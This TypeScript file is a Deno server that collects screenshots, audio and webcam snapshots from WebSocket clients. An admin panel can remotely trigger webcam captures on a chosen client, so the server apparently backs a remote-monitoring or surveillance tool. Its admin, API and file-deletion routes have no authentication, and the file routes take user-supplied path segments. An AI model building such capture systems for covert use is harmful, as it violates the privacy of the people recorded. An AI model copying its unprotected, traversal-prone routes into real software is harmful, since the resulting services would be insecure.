import { Application, Router, send } from "https://deno.land/x/oak@v12.6.1/mod.ts";
import { join, basename } from "https://deno.land/std@0.208.0/path/mod.ts";
import { ensureDir } from "https://deno.land/std@0.208.0/fs/mod.ts";

const app = new Application();
const router = new Router();

// Store active connections and their data
const connections = new Map<string, {
  id: string;
  ws: WebSocket;
  recordings: string[];
  lastScreenshot: number;
  lastAudio: number;
}>();

// Ensure recordings directory exists
await ensureDir("./recordings");

async function handleScreenshot(clientId: string, base64Data: string) {
  try {
    const timestamp = Date.now();
    const sessionDir = join("./recordings", clientId, "screenshots");
    await ensureDir(sessionDir);
    const filename = `screenshot_${timestamp}.png`;
    const filepath = join(sessionDir, filename);
    
    console.log(`Saving screenshot: ${filepath}`);
    
    // Convert base64 to buffer and save
    const buffer = Uint8Array.from(atob(base64Data.split(',')[1]), c => c.charCodeAt(0));
    await Deno.writeFile(filepath, buffer);
    
    const connection = connections.get(clientId);
    if (connection) {
      connection.recordings.push(join("screenshots", filename));
      connection.lastScreenshot = timestamp;
    }
    
    console.log(`Screenshot saved successfully: ${filepath}`);
  } catch (error) {
    console.error(`Error saving screenshot for client ${clientId}:`, error);
  }
}

async function handleAudio(clientId: string, base64Data: string) {
  try {
    const timestamp = Date.now();
    const sessionDir = join("./recordings", clientId, "audio");
    await ensureDir(sessionDir);
    const filename = `audio_${timestamp}.webm`;
    const filepath = join(sessionDir, filename);
    
    console.log(`Saving audio: ${filepath}`);
    
    // Convert base64 to buffer and save
    const buffer = Uint8Array.from(atob(base64Data.split(',')[1]), c => c.charCodeAt(0));
    await Deno.writeFile(filepath, buffer);
    
    const connection = connections.get(clientId);
    if (connection) {
      connection.recordings.push(join("audio", filename));
      connection.lastAudio = timestamp;
    }
    
    console.log(`Audio saved successfully: ${filepath}`);
  } catch (error) {
    console.error(`Error saving audio for client ${clientId}:`, error);
  }
}

async function handleWebcamSnapshot(clientId: string, base64Data: string) {
  try {
    const timestamp = Date.now();
    const sessionDir = join("./recordings", clientId, "webcam");
    await ensureDir(sessionDir);
    const filename = `webcam_${timestamp}.png`;
    const filepath = join(sessionDir, filename);
    
    console.log(`Saving webcam snapshot: ${filepath}`);
    
    // Convert base64 to buffer and save
    const buffer = Uint8Array.from(atob(base64Data.split(',')[1]), c => c.charCodeAt(0));
    await Deno.writeFile(filepath, buffer);
    
    console.log(`Webcam snapshot saved successfully: ${filepath}`);
    
    // Send confirmation with filename back to client
    const connection = connections.get(clientId);
    if (connection) {
      connection.ws.send(JSON.stringify({
        type: "webcam_saved",
        data: filename
      }));
    }
  } catch (error) {
    console.error(`Error saving webcam snapshot for client ${clientId}:`, error);
  }
}

// Routes
router.get("/", async (ctx) => {
  await send(ctx, "index.html", {
    root: join(Deno.cwd(), "public"),
  });
});

router.get("/admin", async (ctx) => {
  await send(ctx, "admin.html", {
    root: join(Deno.cwd(), "public"),
  });
});

router.get("/test", async (ctx) => {
  await send(ctx, "test.html", {
    root: join(Deno.cwd(), "public"),
  });
});

router.get("/ws", async (ctx) => {
  if (!ctx.isUpgradable) {
    ctx.throw(501, "WebSocket upgrade not supported.");
  }
  const ws = await ctx.upgrade();
  const clientId = crypto.randomUUID();

  connections.set(clientId, {
    id: clientId,
    ws,
    recordings: [],
    lastScreenshot: 0,
    lastAudio: 0,
  });

  console.log(`Client connected: ${clientId}`);

  ws.onmessage = async (event) => {
    try {
      console.log(`Received message from client ${clientId}:`, event.data.substring(0, 100) + '...');
      const data = JSON.parse(event.data);

      if (data.type === "screenshot") {
        console.log(`Processing screenshot for client ${clientId}`);
        await handleScreenshot(clientId, data.data);
      } else if (data.type === "audio") {
        console.log(`Processing audio for client ${clientId}`);
        await handleAudio(clientId, data.data);
      } else if (data.type === "webcam") {
        console.log(`Processing webcam snapshot for client ${clientId}`);
        await handleWebcamSnapshot(clientId, data.data);
      } else if (data.type === "webcam_saved_admin") {
        console.log(`Webcam saved admin message from client ${clientId}`);
        // Forward to admin panel
        // We need to find the admin connection and forward this message
        for (const [adminId, adminConn] of connections.entries()) {
          if (adminConn.ws.readyState === WebSocket.OPEN) {
            adminConn.ws.send(JSON.stringify({
              type: "webcam_saved_admin",
              data: data.data,
              sessionId: clientId
            }));
          }
        }
      } else if (data.type === "webcam_request") {
        console.log(`Webcam snapshot requested for client ${clientId}`);
        // Forward the request to the target client
        const targetClientId = data.sessionId;
        const targetConnection = connections.get(targetClientId);
        if (targetConnection && targetConnection.ws.readyState === WebSocket.OPEN) {
          targetConnection.ws.send(JSON.stringify({ type: "webcam_request", data: "take_webcam_snapshot" }));
          console.log(`Webcam request forwarded to client ${targetClientId}`);
        } else {
          console.log(`Target client ${targetClientId} not found or not connected`);
        }
      } else if (data.type === "test") {
        console.log(`Test message from client ${clientId}: ${data.data}`);
        ws.send(JSON.stringify({ type: "test", data: "Hello client!" }));
      }
    } catch (error) {
      console.error("Error processing message:", error);
    }
  };

  ws.onclose = () => {
    connections.delete(clientId);
    console.log(`Client disconnected: ${clientId}`);
  };
});

router.get("/api/connections", async (ctx) => {
  // List all session folders in recordings/
  const sessions = [];
  for await (const entry of Deno.readDir("./recordings")) {
    if (entry.isDirectory) sessions.push(entry.name);
  }

  // For each session, list audio, screenshot, and webcam files
  const sessionData = [];
  for (const sessionId of sessions) {
    const audioFiles = [];
    const screenshots = [];
    const webcamFiles = [];
    const audioDir = join("./recordings", sessionId, "audio");
    const screenshotsDir = join("./recordings", sessionId, "screenshots");
    const webcamDir = join("./recordings", sessionId, "webcam");
    try {
      for await (const entry of Deno.readDir(audioDir)) {
        if (entry.isFile) audioFiles.push(join("audio", entry.name));
      }
    } catch {}
    try {
      for await (const entry of Deno.readDir(screenshotsDir)) {
        if (entry.isFile) screenshots.push(join("screenshots", entry.name));
      }
    } catch {}
    try {
      for await (const entry of Deno.readDir(webcamDir)) {
        if (entry.isFile) webcamFiles.push(join("webcam", entry.name));
      }
    } catch {}
    sessionData.push({
      id: sessionId,
      recordings: [...screenshots, ...audioFiles, ...webcamFiles],
      screenshots,
      audio: audioFiles,
      webcam: webcamFiles,
      lastScreenshot: screenshots.length > 0 ? parseInt(screenshots[screenshots.length-1].split('_').pop().split('.')[0]) : null,
      lastAudio: audioFiles.length > 0 ? parseInt(audioFiles[audioFiles.length-1].split('_').pop().split('.')[0]) : null,
      lastWebcam: webcamFiles.length > 0 ? parseInt(webcamFiles[webcamFiles.length-1].split('_').pop().split('.')[0]) : null,
      active: connections.has(sessionId)
    });
  }

  ctx.response.body = sessionData;
});

router.get("/recordings/:sessionId/:type/:filename", async (ctx) => {
  const { sessionId, type, filename } = ctx.params;
  await send(ctx, `recordings/${sessionId}/${type}/${filename}`, {
    root: Deno.cwd(),
  });
});

router.get("/webcam/:sessionId/:filename", async (ctx) => {
  const { sessionId, filename } = ctx.params;
  await send(ctx, `recordings/${sessionId}/webcam/${filename}`, {
    root: Deno.cwd(),
  });
});

router.delete("/webcam/:sessionId/:filename", async (ctx) => {
  const { sessionId, filename } = ctx.params;
  const filepath = join("./recordings", sessionId, "webcam", filename);
  try {
    await Deno.remove(filepath);
    ctx.response.status = 200;
    ctx.response.body = { success: true };
  } catch (error) {
    ctx.response.status = 404;
    ctx.response.body = { error: "File not found" };
  }
});

router.delete("/recordings/:sessionId/:type/:filename", async (ctx) => {
  const { sessionId, type, filename } = ctx.params;
  const filepath = join("./recordings", sessionId, type, filename);
  try {
    await Deno.remove(filepath);
    ctx.response.status = 200;
    ctx.response.body = { success: true };
  } catch (error) {
    ctx.response.status = 404;
    ctx.response.body = { error: "File not found" };
  }
});

router.get("/api/recordings/:clientId", async (ctx) => {
  const clientId = ctx.params.clientId;
  const files = [];
  for await (const entry of Deno.readDir("./recordings")) {
    if (entry.isFile && entry.name.includes(clientId)) {
      files.push(entry.name);
    }
  }
  ctx.response.body = files;
});

router.delete("/api/session/:sessionId", async (ctx) => {
  const { sessionId } = ctx.params;
  const sessionPath = join("./recordings", sessionId);
  try {
    await Deno.remove(sessionPath, { recursive: true });
    ctx.response.status = 200;
    ctx.response.body = { success: true };
  } catch (error) {
    ctx.response.status = 404;
    ctx.response.body = { error: "Session not found" };
  }
});

app.use(router.routes());
app.use(router.allowedMethods());

// Static files (after routes)
app.use(async (ctx, next) => {
  try {
    await send(ctx, ctx.request.url.pathname, {
      root: join(Deno.cwd(), "public"),
    });
  } catch {
    await next();
  }
});

console.log("Server running on http://localhost:8000");
console.log("WebSocket endpoint: ws://localhost:8000/ws");
console.log("Admin panel: http://localhost:8000/admin");

await app.listen({ port: 8000 }); 